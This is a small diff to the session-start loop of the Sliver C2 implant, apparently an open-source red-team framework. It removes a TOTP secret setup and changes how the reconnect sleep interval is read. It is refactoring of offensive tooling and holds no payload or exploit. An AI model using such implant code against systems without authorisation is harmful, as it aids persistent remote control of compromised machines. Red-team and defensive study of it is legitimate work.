@@ -50,7 +50,6 @@ import (
 
 	"github.com/bishopfox/sliver/implant/sliver/handlers"
 	"github.com/bishopfox/sliver/implant/sliver/transports"
-	"github.com/bishopfox/sliver/implant/sliver/transports/cryptography"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
 	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 )
@@ -77,8 +76,6 @@ type Connection interface {
 func (t *C2) StartSession() (err error) {
 
 	// Maybe move this out of here
-	cryptography.OTPSecret = string(t.Profile.Credentials.TOTPServerSecret)
-
 	for t.attempts < int(t.Profile.MaxConnectionErrors) {
 		switch t.uri.Scheme {
 
@@ -139,7 +136,7 @@ func (t *C2) StartSession() (err error) {
 		// In case of failure to initiate a session, sleep
 		// for the determined ReconnectInterval. This interval
 		// is shared both at the transport and at the Session layer.
-		time.Sleep(transports.GetReconnectInterval())
+		time.Sleep(time.Duration(t.Profile.Interval))
 	}
 
 	// The logical connection should never be nil here, and that
